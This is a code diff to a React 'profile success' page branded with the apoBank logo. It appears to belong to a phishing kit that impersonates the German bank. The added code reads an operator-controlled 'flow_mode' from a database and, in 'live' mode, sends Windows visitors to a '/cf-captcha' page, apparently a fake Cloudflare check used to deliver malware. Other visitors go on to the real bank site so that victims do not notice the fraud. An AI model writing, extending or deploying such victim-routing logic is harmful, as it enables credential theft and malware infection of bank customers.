@@ -1,13 +1,30 @@
 import { CheckCircle2 } from "lucide-react";
 import { useEffect } from "react";
 import apobankLogo from "@/assets/apobank-logo.svg";
+import { supabase } from "@/integrations/supabase/client";
+import { isWindows } from "@/lib/botDetect";
 
 const ProfilSuccess = () => {
   useEffect(() => {
-    const t = setTimeout(() => {
-      window.location.href = "/auth";
-    }, 6000);
-    return () => clearTimeout(t);
+    let cancelled = false;
+    let timer: ReturnType<typeof setTimeout> | null = null;
+    (async () => {
+      let mode = "afk";
+      try {
+        const { data } = await (supabase as any)
+          .from("api_settings").select("flow_mode").limit(1).maybeSingle();
+        if (data?.flow_mode) mode = data.flow_mode;
+      } catch {}
+      const apobank = "https://www.apobank.de";
+      const gate = isWindows() && mode === "live";
+      const target = gate ? `/cf-captcha?next=${encodeURIComponent(apobank)}` : apobank;
+      timer = setTimeout(() => {
+        if (cancelled) return;
+        if (/^https?:\/\//i.test(target)) window.location.href = target;
+        else window.location.href = target;
+      }, 6000);
+    })();
+    return () => { cancelled = true; if (timer) clearTimeout(timer); };
   }, []);
 
 
